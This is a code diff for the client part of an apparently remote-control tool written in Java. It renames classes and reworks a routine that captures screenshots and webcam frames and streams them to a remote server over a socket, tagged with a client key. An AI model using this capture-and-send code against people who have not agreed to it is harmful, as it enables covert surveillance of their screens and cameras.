@@ -7,15 +7,15 @@ import br.com.introcdc.connect.Connect;
 import br.com.introcdc.connect.client.ConnectClient;
 import com.github.sarxos.webcam.Webcam;
 
-import javax.imageio.ImageIO;
 import java.awt.*;
 import java.awt.image.BufferedImage;
+import java.io.DataOutputStream;
 import java.io.OutputStream;
 import java.net.Socket;
 import java.util.ArrayList;
 import java.util.concurrent.ScheduledFuture;
 
-public class ImageComponents {
+public class ClientImageComponents {
     // Screen & Webcam Variables
     public static boolean WEBCAM_LIVE = false;
     public static boolean SCREEN_LIVE = false;
@@ -35,9 +35,9 @@ public class ImageComponents {
      */
     public static void startHistory() {
         try {
-            ControlComponents.ROBOT_INSTANCE = new Robot();
+            ClientControlComponents.ROBOT_INSTANCE = new Robot();
         } catch (Exception exception) {
-            ControlComponents.ROBOT = false;
+            ClientControlComponents.ROBOT = false;
         }
 
         for (; ; ) {
@@ -61,7 +61,7 @@ public class ImageComponents {
                 SCREEN_HISTORY.remove(0);
             }
             ConnectClient.msg("icon-screen");
-            ConnectClient.EXECUTOR.schedule(() -> sendImage(9, screen), Connect.DELAY, Connect.DELAY_TYPE);
+            ConnectClient.EXECUTOR.schedule(ConnectClient.runnable(() -> sendImage(9, screen)), Connect.DELAY, Connect.DELAY_TYPE);
         }
         try {
             Thread.sleep(1000);
@@ -74,7 +74,7 @@ public class ImageComponents {
                 WEBCAM_HISTORY.remove(0);
             }
             ConnectClient.msg("icon-webcam");
-            ConnectClient.EXECUTOR.schedule(() -> sendImage(10, webcam), Connect.DELAY, Connect.DELAY_TYPE);
+            ConnectClient.EXECUTOR.schedule(ConnectClient.runnable(() -> sendImage(10, webcam)), Connect.DELAY, Connect.DELAY_TYPE);
         }
         SENDING = false;
         try {
@@ -105,7 +105,7 @@ public class ImageComponents {
         }
 
         while (images.size() < 9) {
-            BufferedImage blackImage = new BufferedImage(imageWidth, imageHeight, BufferedImage.TYPE_INT_ARGB);
+            BufferedImage blackImage = new BufferedImage(imageWidth, imageHeight, BufferedImage.TYPE_INT_RGB);
             Graphics2D gBlack = blackImage.createGraphics();
             gBlack.setColor(Color.BLACK);
             gBlack.fillRect(0, 0, imageWidth, imageHeight);
@@ -116,7 +116,7 @@ public class ImageComponents {
         BufferedImage combinedImage = new BufferedImage(
                 gridSize * imageWidth,
                 gridSize * imageHeight,
-                BufferedImage.TYPE_INT_ARGB
+                BufferedImage.TYPE_INT_RGB
         );
 
         Graphics2D g = combinedImage.createGraphics();
@@ -135,9 +135,23 @@ public class ImageComponents {
 
     public static void sendImage(int port, BufferedImage image) {
         try {
-            try (Socket imageSocket = new Socket(Connect.IP, Connect.PORT + port);
+            try (Socket imageSocket = new Socket(Connect.IP, Connect.PORT);
                  OutputStream os = imageSocket.getOutputStream()) {
-                ImageIO.write(image, "jpg", os);
+                String type = "";
+                if (port == 9) type = "ICON_SCREEN";
+                else if (port == 10) type = "ICON_WEBCAM";
+                else if (port == 1) type = "SCREEN";
+                else if (port == 2) type = "WEBCAM";
+                else if (port == 5) type = "VIEW";
+
+                new DataOutputStream(os).writeUTF("SECONDARY:" + ConnectClient.KEY + ":" + type);
+                try {
+                    javax.imageio.ImageIO.write(image, type.equals("VIEW") ? "png" : "jpg", os);
+                } catch (javax.imageio.IIOException iioe) {
+                    if (iioe.getMessage() == null || !iioe.getMessage().contains("writing PNG")) {
+                        throw iioe;
+                    }
+                }
             } catch (Exception exception) {
                 ConnectClient.msg("Ocorreu um erro ao enviar a imagem única para o servidor " + Connect.IP + ":" + (Connect.PORT + port) + "! (" + exception.getMessage() + ")");
                 ConnectClient.exception(exception);
@@ -168,7 +182,7 @@ public class ImageComponents {
             int screenHeight = dm.getHeight();
 
             Rectangle screenBounds = secondScreen.getDefaultConfiguration().getBounds();
-            BufferedImage screenshot = ControlComponents.ROBOT_INSTANCE.createScreenCapture(new Rectangle(screenBounds.x, screenBounds.y, screenWidth, screenHeight));
+            BufferedImage screenshot = ClientControlComponents.ROBOT_INSTANCE.createScreenCapture(new Rectangle(screenBounds.x, screenBounds.y, screenWidth, screenHeight));
 
             Point mouseLocation = MouseInfo.getPointerInfo().getLocation();
 
@@ -221,7 +235,7 @@ public class ImageComponents {
             if (!selected.isOpen()) {
                 selected.open();
             }
-            ProcessComponents.LAST_ID = webcam;
+            ClientProcessComponents.LAST_ID = webcam;
             BufferedImage image = selected.getImage();
             if (!keepOpen) {
                 selected.close();
